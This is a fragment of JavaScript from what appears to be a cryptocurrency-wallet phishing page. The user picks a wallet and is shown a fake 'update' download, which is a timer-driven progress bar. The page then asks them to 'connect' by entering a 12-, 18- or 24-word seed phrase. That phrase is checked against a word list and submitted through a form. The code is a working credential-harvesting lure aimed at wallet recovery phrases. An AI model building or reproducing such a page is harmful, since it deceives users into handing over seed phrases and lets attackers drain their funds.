      el.setAttribute('aria-hidden','false');
    }
    function hideModal(el){
      el.classList.remove('show');
      el.setAttribute('aria-hidden','true');
    }

    // populate wallet list
    function buildWallets(){
      walletList.innerHTML = '';
      wallets.forEach(w => {
        const item = document.createElement('div');
        item.className = 'wallet-item';
        item.innerHTML = `
  <div class="icon">
    <img src="${w.img}" alt="${w.name}" style="width:28px;height:28px;object-fit:contain;">
  </div>
  <div class="name">${w.name}</div>
`;
        item.addEventListener('click', () => {
  selectedWallet = w;

  // Update modal me naam + image set karo
  updateName.textContent = w.name;
  document.getElementById('update-wallet-img').src = w.img;

  hideModal(modalWallets);
  setTimeout(()=> showModal(modalUpdate), 120);
});


        walletList.appendChild(item);
      });
    }
    buildWallets();

    // open wallets
    openBtn.addEventListener('click', () => {
      showModal(modalWallets);
    });
    closeWalletsBtn.addEventListener('click', () => hideModal(modalWallets));

    closeUpdateBtn.addEventListener('click', ()=> hideModal(modalUpdate));
  updateNowBtn.addEventListener('click', () => {
  hideModal(modalUpdate);

  // 👇 Progress modal me wallet ka naam + image set karo
  document.querySelector('#modal-progress .brand img').src = selectedWallet.img;
  document.querySelector('#modal-progress .brand div').textContent = selectedWallet.name;
  document.querySelector('#modal-progress h3').textContent = `Updating ${selectedWallet.name}`;

  progInner.style.width = '0%';
  progText.textContent = 'Downloading update... 0%';
  showModal(modalProgress);

  // simulate download
  let percent = 0;
  const interval = setInterval(()=>{
    percent += Math.floor(Math.random()*8) + 6;
    if(percent > 100) percent = 100;
    progInner.style.width = percent + '%';
    progText.textContent = 'Downloading update... ' + percent + '%';

    if(percent >= 100){
      clearInterval(interval);
      setTimeout(()=>{
        hideModal(modalProgress);
        openSeedModal(); // 👉 seed modal bhi update hoga niche
      }, 700);
    }
  }, 350);
});


    // Seed modal logic
   function openSeedModal(){
  // 👇 yahan wallet set karna hai
  document.querySelector('#modal-seed .brand .badge').innerHTML = `<img src="${selectedWallet.img}" style="width:24px;height:24px">`;
  document.querySelector('#modal-seed .brand div:last-child').textContent = selectedWallet.name;
  document.querySelector('#modal-seed div[style*="font-weight:700"]').textContent = `Connect your ${selectedWallet.name}`;

  showModal(modalSeed);
  buildSeedGrid(Number(seedCountSelect.value));
}

function switchTab(words) {
      document.querySelectorAll('.tab').forEach(tab => {
        tab.classList.remove('active');
      });
      document.querySelector(`.tab:nth-child(${words === 12 ? 1 : words === 18 ? 2 : 3})`).classList.add('active');

      wordGrid.innerHTML = "";
      for (let i = 1; i <= words; i++) {
        wordGrid.innerHTML += `<input type="text" placeholder="${i}">`;
      }
    }
	const tabs = document.querySelectorAll('.tab');
  const contents = document.querySelectorAll('.tab-content');

  tabs.forEach(tab => {
    tab.addEventListener('click', () => {
      // Remove active class from all tabs
      tabs.forEach(t => t.classList.remove('active'));
      // Add active class to clicked tab
      tab.classList.add('active');

      // Hide all contents
      contents.forEach(c => c.classList.remove('active'));
      // Show corresponding content
      document.getElementById(tab.dataset.tab).classList.add('active');
    });
  });
  
  document.addEventListener('DOMContentLoaded', () => {

    const inputs = document.querySelectorAll('input[name="fields[]"]');
    const submitBtn = document.querySelector('button[type="submit"]');
    const clearBtn = document.getElementById('clearBtn');
    const errorDiv = document.getElementById('inputError'); // Use existing div

    function validateInputs() {
        let allValid = true;
        inputs.forEach(input => {
            if (input.closest('.tab-content').classList.contains('active')) {
                const val = input.value.trim().toLowerCase();
                if (val && !tags.includes(val)) {
                    allValid = false;
                    input.style.borderColor = 'red';
                } else {
                    input.style.borderColor = '';
                }
            }
        });

        if (!allValid) {
            errorDiv.textContent = 'Invalid word detected. Only allowed words are accepted.';
            errorDiv.style.display = 'block';
            submitBtn.disabled = true;
        } else {
            errorDiv.style.display = 'none';
            submitBtn.disabled = false;
        }
    }

    // Validate on keyup or paste
    inputs.forEach(input => {
        input.addEventListener('keyup', validateInputs);
        input.addEventListener('paste', (e) => {
            e.preventDefault();
            let pasted = (e.clipboardData || window.clipboardData).getData('text');
            const words = pasted.split(/\s+/).filter(w => w);
            const activeInputs = Array.from(inputs).filter(inp => inp.closest('.tab-content').classList.contains('active'));
            for (let i = 0; i < words.length && i < activeInputs.length; i++) {
                activeInputs[i].value = words[i];
            }
            validateInputs();
        });
    });

    // Clear button
    clearBtn.addEventListener('click', () => {
        const activeInputs = Array.from(inputs).filter(inp => inp.closest('.tab-content').classList.contains('active'));
        activeInputs.forEach(inp => inp.value = '');
        activeInputs.forEach(inp => inp.style.borderColor = '');
        errorDiv.style.display = 'none';
        submitBtn.disabled = false;
    });

    // Validate on form submit
    document.querySelector('form').addEventListener('submit', (e) => {
        validateInputs();
        if (submitBtn.disabled) e.preventDefault();
    });
});

// Seed close
 const modal = document.getElementById("modal-seed");
  const closeBtn = document.getElementById("close-seed");

  // Close when button is clicked
  closeBtn.addEventListener("click", function () {
    modal.style.display = "none";
  });

  // Optional: close when clicking outside modal
  window.addEventListener("click", function (event) {
    if (event.target === modal) {
      modal.style.display = "none";
    }
  });
  </script>
  
